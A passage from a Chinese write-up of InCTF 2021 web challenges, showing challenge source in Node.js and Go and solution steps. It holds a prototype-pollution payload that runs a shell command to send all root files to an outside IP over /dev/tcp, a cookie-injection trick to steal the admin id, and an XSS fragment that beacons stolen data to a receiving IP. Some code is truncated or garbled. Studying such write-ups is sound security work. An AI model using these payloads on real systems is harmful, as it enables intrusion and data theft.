            }
            if(config['version']){
                output=output+ "version is :"+ config['version']+'\n\n'
            }
            if(config['author']){
                output=output+"Author of package:"+config['author']+'\n\n'
            }
            if(config['license']){
                var link=''
                if(config['license']==='ISC'){
                    link='https://opensource.org/licenses/ISC'+'\n\n'
                }
                if(config['license']==='MIT'){
                    link='https://www.opensource.org/licenses/mit-license.php'+'\n\n'
                }
                if(config['license']==='Apache-2.0'){
                    link='https://opensource.org/licenses/apache2.0.php'+'\n\n'
                }
                if(link==''){
                    var link='https://opensource.org/licenses/'+'\n\n'
                }
                output=output+'license :'+config['license']+'\n\n'+'find more details here :'+link;
            }
            if(config['dependencies']){
                output=output+"following dependencies are thier corresponding versions are used:" +'\n\n'+'     '+JSON.stringify(config['dependencies'])+'\n'
            }
            const src = "package1.json";
            const dest = "package.json";
            fs.copyFile(src, dest, (error) => {
                if (error) {
                    console.error(error);
                    return;
                }
            });
            res.render('index.squirrelly', {'output':output})
        });
    });
    var server= app.listen(port, () => {
        console.log(`Example app listening at http://localhost:${port}`)
    });
    server.setTimeout(10000);
这里推测需要原型链污染RCE
在name中添加
    {
        "__proto__":{
             "defaultFilter" : "e'));process.mainModule.require('child_process').execSync('/bin/bash -c \\'cat /* > /dev/tcp/172.17.0.2:1554/\\'')//"
          }
    }
###  总结
知识点在于重复键名读取最后一个，ujson解析有\ud800不可读，原型链污染反弹shell
借鉴[JsonAnalyser](https://blog.bi0s.in/2021/08/15/Web/inCTFi21-JsonAnalyser/)
## Notepad系列
###  notepad1
####  环境搭建
问题一
go: github.com/gorilla/[handlers@v1.5.1](mailto:handlers@v1.5.1): Get “https://proxy.golang.org/github.com/gorilla/handlers/@v/v1.5.1.mod“:
dial tcp 142.251.43.17:443: connect: connection refused
解决方法
在dockerfile中增加go env -w GOPROXY=
问题二
404
解决方法
改main.go的r.host为自己环境的访问网址（感谢jiryu指点）
####  解题
#####  源码
    package main
    import (
        "crypto/md5"
        "encoding/hex"
        "flag"
        "fmt"
        "log"
        "math/rand"
        "net/http"
        "os"
        "regexp"
        "strings"
        "time"
        "github.com/gorilla/handlers"
        "github.com/gorilla/mux"
    )
    const adminID = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    const adminNOTE = "inctf{flag}"
    var Notes = make(map[string]string)
    // Prevent XSS on api-endpoints ¬‿¬
    var cType = map[string]string{
        "Content-Type":            "text/plain",
        "x-content-type-options":  "nosniff",
        "X-Frame-Options":         "DENY",
        "Content-Security-Policy": "default-src 'none';",
    }
    func cookGenerator() string {
        hash := md5.Sum([]byte(string(rand.Intn(30))))
        return hex.EncodeToString((hash)[:])
    }
    func headerSetter(w http.ResponseWriter, header map[string]string) {
        for k, v := range header {
            w.Header().Set(k, v)
        }
    }
    func getIDFromCooke(r *http.Request, w http.ResponseWriter) string {
        var cooke, err = r.Cookie("id")
        re := regexp.MustCompile("^[a-zA-Z0-9]+$")
        var cookeval string
        if err == nil && re.MatchString(cooke.Value) && len(cooke.Value) = 30 {
            cookeval = cooke.Value
        } else {
            cookeval = cookGenerator()
            c := http.Cookie{
                Name:     "id",
                Value:    cookeval,
                SameSite: 2,
                HttpOnly: true,
                Secure:   false,
            }
            http.SetCookie(w, &c)
        }
        return cookeval
    }
    func add(w http.ResponseWriter, r *http.Request) {
        id := getIDFromCooke(r, w)
        if id != adminID {
            r.ParseForm()
            noteConte := r.Form.Get("content")
            if len(noteConte) 
将\
分到下面语句中
debug=a&Set-Cookie=var A = “”;
debug=a&Set-Cookie=var B = A + “”;
………………………..
访问可得cookie
第二步设置cookie，我们使用set-cookie，利用find的debug
    debug=a&Set-Cookie=id=${cookie}%3B%20path=/get
然后我们访问get，发现访问时cookie添加了admin的id，flag获得
###  notepad15
环境搭建上同
####  解题
15和1的区别就在于不能直接上传xss，以及对传参进行了限制
    for v, d := range param {
        for _, k := range d {
            if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && len(d) response.text()).then(data=>navigator.sendBeacon(‘接收IP’,data))`)
借鉴[Notepad Series – InCTF Internationals 2021 |
bi0s](https://blog.bi0s.in/2021/08/16/Web/notepad-inctf21/)
## raas
由于没有环境可以复现，当时我也没有看这道题，所以给个wp地址[RaaS – CTFs
(zeyu2001.com)](https://ctf.zeyu2001.com/2021/inctf-2021/raas)
简单来说就是可以根据file协议读取文件，根据dockerfile得知存在文件app.py，发现使用了redis，当GET传参，cookie存在userid且判断isadmin为yes则返回flag，然后以gopher传输redis命令